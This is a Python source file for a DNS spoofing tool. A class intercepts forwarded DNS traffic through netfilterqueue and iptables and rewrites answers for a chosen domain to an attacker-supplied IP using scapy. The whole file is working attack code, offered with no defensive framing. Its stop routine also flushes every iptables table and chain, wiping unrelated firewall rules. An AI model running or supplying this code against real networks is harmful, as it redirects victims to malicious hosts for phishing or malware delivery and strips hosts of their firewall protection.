import os
import netfilterqueue
import threading
from scapy.all import IP, DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

class DNSSPoof:
    def __init__(self, device_name, target_ip, target_domain: str, spoof_ip):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.spoof_ip = spoof_ip
        self.device_name = device_name
        self.run = False
        
    def __str__(self) -> str:
        return "DNSSPoof: target_ip: {}, target_domain: {}, spoof_ip: {}".format(self.target_ip, self.target_domain, self.spoof_ip)
    
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            q_name = scapy_packet[DNSQR].qname.decode("utf-8")
            print("[*] DNS request for {}".format(q_name))
            if self.target_domain in q_name:
                print("[+] Spoofing DNS Request for {} to {}".format(q_name, self.spoof_ip))

                answer = DNSRR(rrname=q_name, rdata=self.spoof_ip)
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum

                if scapy_packet.haslayer(UDP):
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum

                packet.set_payload(bytes(scapy_packet))
        
        packet.accept()
        
    def __run(self):
        self.run = True

        while self.run:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()

    def start(self) -> threading.Thread:
        """Starts the DNS spoofing"""

        print("[*] Starting DNS spoofing")

        self.__set_iptables()

        th = threading.Thread(target = self.__run)
        th.daemon = True
        th.start()

        print("[+] DNS spoofing started")
        return th

    def stop(self):
        print("[*] Stopping DNS spoofing")

        self.run = False

        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("iptables -t nat --delete-chain")
        os.system("iptables -t mangle --flush")
        os.system("iptables -t mangle --delete-chain")
        os.system("iptables -X")

        print("[+] DNS spoofing stopped")

    def __set_iptables(self):
        """Sets the iptables to redirect the DNS requests to the target IP"""
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

        #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        #os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
